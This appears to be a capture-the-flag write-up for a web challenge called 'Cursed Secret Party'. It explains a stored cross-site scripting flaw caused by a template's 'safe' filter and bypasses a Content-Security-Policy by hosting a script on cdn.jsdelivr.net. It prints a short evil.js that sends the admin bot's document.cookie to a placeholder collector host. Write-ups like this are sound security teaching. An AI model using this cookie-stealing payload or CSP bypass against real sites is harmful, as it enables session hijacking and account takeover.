# Cursed Secret Party
## Steps

1. Send a normal req.

image

2. Check source, how it works ?? :
there is a route `/api/submit`, it gets our data to check and add into database, and then a `BOT` will visit `/admin` to colect our data and then renders them in `admin.html` but in `admin.html` has a problem

```
    <div class="card-header"> <strong>Halloween Name</strong> : {{ request.halloween_name | safe }} </div>
```
- We see that the `halloween_name` marked it as `safe`, it means the Cross-Site script atk (i have no ideal about it @@@)
Now, let's see how the bot works.

image

- The bot create a JWT token with flag and roles to be authenticated as an admin and then deletes all by goto(`.../admin/delete_all...`)

**Ideal**: we'll steal the cookie of bot.

- And final note is `Content-Security-Policy` header in `index.js`

```
app.use(function (req, res, next) {
    res.setHeader(
        "Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'"
    );
    next();
});

```
- It means there's no injected JS files can execute in because there's no `inline` parameter in the `script-src` directive.

**Ideal** : create a public Gitbub repository and host our JS file on `https://cdn.jsdelivr.net`

- The format should be as follows:

`https://cdn.jsdelivr.net/gh/<github_username>/<repository_name>/<file_name>.js`

- For example: 

`https://cdn.jsdelivr.net/gh/0jamaKig86/code.py/evil.js`

- evil.js
```
var xhttp = new XMLHttpRequest();
xhttp.open('GET', 'http://BURP-CLIENT-ID/?' + document.cookie, true);
xhttp.send();
```
3. Final payload.

imgae

- Check burp-client.

image

- Decode session.

image
